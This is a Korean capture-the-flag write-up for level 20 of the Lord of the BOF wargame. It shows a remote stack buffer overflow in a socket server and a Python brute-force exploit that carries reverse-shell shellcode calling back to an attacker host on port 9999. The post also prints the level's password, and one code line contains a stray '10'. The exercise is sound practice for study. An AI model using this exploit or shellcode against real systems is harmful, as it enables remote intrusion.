---
layout: single
title: "LOB 20번 (xavius -> death_night)"
#description: ""
date: 2016-02-05 12:00:00 -0400
# modified: 
tags: 
- wargame
- writeup
- pwnable
- lob
comments: true
share: true
---

source code:

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - dark knight
        - remote BOF
*/

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <dumpcode.h>

main()
{
        char buffer[40];

        int server_fd, client_fd;
        struct sockaddr_in server_addr;
        struct sockaddr_in client_addr;
        int sin_size;

        if((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1){
                perror("socket");
                exit(1);
        }

        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(6666);
        server_addr.sin_addr.s_addr = INADDR_ANY;
        bzero(&(server_addr.sin_zero), 8);

        if(bind(server_fd, (struct sockaddr *)&server_addr, sizeof(struct sockaddr)) == -1){
                perror("bind");
                exit(1);
        }

        if(listen(server_fd, 10) == -1){
                perror("listen");
                exit(1);
        }

        while(1) {
                sin_size = sizeof(struct sockaddr_in);
                if((client_fd = accept(server_fd, (struct sockaddr *)&client_addr, &sin_size)) == -1){
                        perror("accept");
                        continue;
                }

                if (!fork()){
                        send(client_fd, "Death Knight : Not even death can save you from me!\n", 52, 0);
                        send(client_fd, "You : ", 6, 0);
                        recv(client_fd, buffer, 256, 0);
                        close(client_fd);
                        break;
                }

                close(client_fd);
                while(waitpid(-1,NULL,WNOHANG) > 0);
        }
        close(server_fd);
}
```

평범한 소켓 통신 서버 역할을 하는 프로그램이며, 원격접속한 사용자로부터 입력값을 받고 있다. 그리고 이를 통해 Buffer Overflow(이하 BOF)가 발생하게 된다. 그리고 이전의 문제들과 다르게 이 버퍼에는 아무런 보호조치가 되어있지 않다. 결국 이 문제는 원격지에서 이 LOB 서버로 접속한 후, 쉘코드와 함께 bof를 발생시키면 된다. 우선 따로 만든 공격지에서 LOB 서버 6666번 포트로 nc 명령어를 사용하였다.

![nc](https://s01va.github.io/assets/images/2016-02-05-LOB-20/0.png)

위와 같이 입력값을 받고 있다.
공격지인 다른 리눅스 로컬로 리버스 쉘코드를 사용한 브루트 포스 코드를 작성해 두었다. 원격에서 공격하는 만큼 ret주소를 알 수 없기 때문에 브루트 포스를 사용했다.


[Reverse shellcode 출처](https://orang.tistory.com/entry/%ED%95%B4%EC%BB%A4%EC%8A%A4%EC%BF%A8-LOB-xavius-deathknight-by-ORANG)

```c
import sys, struct, socket

host = "192.168.235.135"
port = 6666

hexhost = "\xc0\xa8\xeb\x8a" # 192.168.235.138
recvhexport = "\x27\x0f" # port 9999

shellcode = "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68" + hexhost + "\x68\x02\x00" + recvhexport + "\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80"10 
padding1 = "A" * 44
padding2 = "\x90" * 50
payload = ""

for i in range(0xff, 0xf0, -1):
	for j in range(0xff, 0x00, -1):
		for k in range(0xff, 0x00, -1):
		 	r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		 	r.connect((host, port))
		 	retaddr = chr(k) + chr(j) + chr(i) + "\xbf"
		 	print("RET: " + str(hex(struct.unpack("I", retaddr)[0])))
		 	payload += padding1
		 	payload += retaddr
		 	payload += padding2
		 	payload += shellcode
		 	print(r.recv(52))
		 	print(r.recv(6))
		 	r.send(payload)
		 	r.close()
```

LOB 서버에 6666번 포트로 연결하고, receive를 9999번 포트로 받으려고 한다.

![nc2](https://s01va.github.io/assets/images/2016-02-05-LOB-20/1.png)

nc로 공격지에서 listen 모드로 9999번 포트를 열어두고, 위의 브루트포스 코드를 실행시킨다.

![exploit](https://s01va.github.io/assets/images/2016-02-05-LOB-20/2.png)


my-pass: got the life